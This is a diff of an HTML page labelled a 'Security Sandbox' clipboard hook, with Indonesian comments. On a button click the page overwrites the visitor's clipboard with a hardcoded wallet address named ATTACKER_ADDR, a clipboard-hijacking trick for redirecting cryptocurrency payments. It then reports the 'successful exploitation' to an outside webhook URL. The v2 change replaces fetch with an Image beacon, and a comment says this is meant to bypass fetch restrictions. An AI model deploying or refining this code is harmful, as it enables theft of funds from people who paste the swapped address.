@@ -3,52 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research: Clipboard Hook</title>
+    <title>Security Research: Clipboard Hook v2</title>
     <style>
-        body { font-family: monospace; padding: 20px; line-height: 1.4; font-size: 14px; }
-        .log { background: #000; color: #0f0; padding: 10px; border-radius: 5px; margin-top: 20px; word-break: break-all; }
-        button { width: 100%; padding: 15px; font-size: 16px; background: #dc3545; color: white; border: none; border-radius: 5px; }
+        body { font-family: monospace; padding: 20px; }
+        .log { background: #000; color: #0f0; padding: 10px; margin-top: 20px; word-break: break-all; }
+        button { width: 100%; padding: 15px; background: #dc3545; color: white; border: none; }
     </style>
 </head>
 <body>
-    <h2>Security Sandbox</h2>
+    <h2>Security Sandbox v2</h2>
     <button onclick="runTest()">Uji Clipboard (Click Me)</button>
-    
     <div class="log" id="logBox">Status: Menunggu aksi...</div>
 
     <script>
-        const WEBHOOK_URL = "
- https://webhooksite.net/82a7aeea-acdd-4acd-8b4e-cae50d93599b"; // Ganti dengan Webhook URL Anda
+        const WEBHOOK_URL = "https://webhooksite.net/82a7aeea-acdd-4acd-8b4e-cae50d93599b";
         const ATTACKER_ADDR = "0xcB108eeDbaAfc5b6aA9Cb2Cb93Fd801a238b6179";
 
         function log(msg) {
             document.getElementById('logBox').innerText = msg;
+            console.log(msg);
         }
 
-        async function sendWebhook(status) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "🚨 Eksploitasi Berhasil: " + status })
-                });
-            } catch (e) {
-                console.error("Webhook gagal dikirim");
-            }
+        // Metode alternatif menggunakan Image untuk bypass pembatasan fetch
+        function sendWebhookViaImage(status) {
+            const img = new Image();
+            img.src = WEBHOOK_URL + "?data=" + encodeURIComponent(status);
         }
 
         async function runTest() {
-            log("Mencoba akses clipboard...");
-            
+            log("1. Mencoba akses clipboard...");
             try {
-                // Menulis alamat penyerang ke clipboard
                 await navigator.clipboard.writeText(ATTACKER_ADDR);
-                log("SUKSES: Alamat telah diganti ke: " + ATTACKER_ADDR);
+                log("2. SUKSES: Clipboard tertulis!");
                 
-                // Mengirim notifikasi ke webhook
-                await sendWebhook("Clipboard telah di-overwrite menjadi " + ATTACKER_ADDR);
+                log("3. Mencoba kirim webhook...");
+                sendWebhookViaImage("Eksploitasi Berhasil di perangkat target");
+                log("4. Proses selesai.");
             } catch (err) {
-                log("DIBLOKIR/ERROR: " + err.message);
+                log("ERROR: " + err.name + " - " + err.message);
             }
         }
     </script>
